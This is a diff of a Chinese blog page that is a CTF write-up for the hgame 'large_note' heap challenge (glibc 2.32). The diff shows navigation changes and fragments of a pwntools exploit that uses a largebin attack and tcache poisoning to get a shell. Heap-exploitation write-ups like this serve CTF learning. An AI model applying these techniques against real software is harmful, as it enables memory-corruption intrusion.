@@ -219,9 +219,20 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/tags/">
               
-              分类
+              标签
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/about/">
+              
+              关于
               
               
             </a>
@@ -241,20 +252,9 @@
           
           
           <li>
-            <a href="/tags/">
+            <a href="/categories/">
               
-              标签
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
-            <a href="/about/">
-              
-              关于
+              分类
               
               
             </a>
@@ -420,9 +420,11 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1 id="LargebinsAttact与TcachebinsPosioning"><a href="#LargebinsAttact与TcachebinsPosioning" class="headerlink" title="LargebinsAttact与TcachebinsPosioning"></a>LargebinsAttact与TcachebinsPosioning</h1><p>复现hgame_week3 - large_note</p>
+        <h1>LargebinsAttact与TcachebinsPosioning</h1>
+<p>复现hgame_week3 - large_note</p>
 <p>环境 glibc-2.32</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230622137.png" alt></p>
+<h2 id="题目">题目</h2>
+<p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230622137.png" alt></p>
 <p>看下菜单</p>
 <p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230711043.png" alt></p>
 <p>Add-note 限制了malloc大小 0x500 - 0x900</p>
@@ -433,7 +435,9 @@
 <p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230849531.png" alt></p>
 <p>Show-note 没有限制</p>
 <p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102230918914.png" alt></p>
-<h2 id="解题准备"><a href="#解题准备" class="headerlink" title="解题准备"></a>解题准备</h2><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>目标明确打largebin_attack往任意地点写大数。</p>
+<h2 id></h2>
+<h2 id="解题思路">解题思路</h2>
+<p>目标明确打largebin_attack往任意地点写大数。</p>
 <p>首先通过unsortedbins泄露libc和heap</p>
 <pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x728</span>)
 add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)
@@ -454,7 +458,7 @@ show_addr(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)
 
 add(<span class="hljs-number">0</span>,<span class="hljs-number">0x728</span>)<span class="hljs-comment">#复原一下</span>
 add(<span class="hljs-number">2</span>,<span class="hljs-number">0x718</span>) <span class="hljs-comment">#复原一下</span></code></pre>
-<p>可以考虑改global<em>max_fast或者mp</em>.tcache_bins。首先需要知道这两个地方的偏移。两种方法。</p>
+<p>可以考虑改global_max_fast或者mp_.tcache_bins。首先需要知道这两个地方的偏移。两种方法。</p>
 <p>方法一利用gdb.debug启动后，使用<code>pwndbg</code>打印地址</p>
 <pre><code class="hljs python">r = gdb.debug(<span class="hljs-string">&#x27;./vuln&#x27;</span>,<span class="hljs-string">&#x27;set debug-file-directory ./.debug/&#x27;</span>)</code></pre>
 <p><img src="/cn/Sagiring_markdown/LargebinsAttact%E4%B8%8ETcachebinsPosioning/image-20231102231915130.png" alt></p>
@@ -573,7 +577,7 @@ add(<span class="hljs-number">5</span>,<span class="hljs-number">0x738</span>)
 <span class="hljs-comment"># 改完分配不了内存 malloc(): memory corruption (fast)</span>
 <span class="hljs-comment">#换tcachebins</span>
 <span class="hljs-comment">#打tcache_posioning</span></code></pre>
-<p>经过尝试后改global_max_fast之后无法分配内存，报错<em>malloc(): memory corruption (fast)</em>原因尚待探究。</p>
+<p>经过尝试后改global_max_fast之后无法分配内存，报错*malloc(): memory corruption (fast)*原因尚待探究。</p>
 <p>换打mp_.tcache_bins，启用tcachebins。考虑打tcachebins_posioning.同样贴出how2heap</p>
 <pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
@@ -658,12 +662,16 @@ show_addr(<span class="hljs-string">&#x27;__free_hook&#x27;</span>,libc.sym[<spa
 pause()
 delete(<span class="hljs-number">13</span>)
 r.interactive()</code></pre>
-<p>拿到shell。好玩。</p>
+<p>拿到shell。学的有点上头。</p>
 
 
         <hr>
         <!-- Pager -->
         <ul class="pager">
+          
+          <li class="previous">
+            <a href="/cn/Sagiring_markdown/Setcontext与Magic-Gadget/" data-toggle="tooltip" data-placement="top" title="Setcontext与Magic-Gadget">&larr; Previous Post</a>
+          </li>
           
           
           <li class="next">
@@ -804,7 +812,7 @@ r.interactive()</code></pre>
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#LargebinsAttact%E4%B8%8ETcachebinsPosioning"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">LargebinsAttact与TcachebinsPosioning</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E5%87%86%E5%A4%87"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">解题准备</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">解题思路</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">LargebinsAttact与TcachebinsPosioning</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text"></span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">解题思路</span></a></li></ol></li></ol>
         
         </div>
       </aside>
